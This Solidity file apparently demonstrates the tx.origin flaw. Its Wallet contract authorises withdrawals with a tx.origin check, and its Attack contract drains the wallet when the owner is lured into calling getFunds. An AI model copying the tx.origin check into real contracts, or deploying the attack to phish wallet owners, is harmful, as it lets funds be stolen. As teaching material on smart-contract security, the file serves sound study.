//SPDX-License-Identifier:MIT
pragma solidity ^0.8.7;


contract Wallet{
    address owner;

    constructor(){
        owner=payable(msg.sender);
    }

    function deposite()external payable{

    }

    function withdraw(address to,uint amt)external {
        require(tx.origin == owner,"ur not the owner");
        payable(to).transfer(amt);
    }

    function getBalance()external view returns(uint ){
        return address(this).balance;
    }

    function origin()external view returns(address){
        return tx.origin;
    }
}

//attack contract
contract Attack{
    Wallet target;
    address payable owner;

    constructor(Wallet a){
        owner=payable(msg.sender);
        target=Wallet(a);
    }

    fallback()external payable{
        
    }

    receive()external payable{

    }

    function getFunds()external{
        target.withdraw(owner,address(target).balance);
    }

    function getBalance()external view returns(uint ){
        return address(this).balance;
    }
}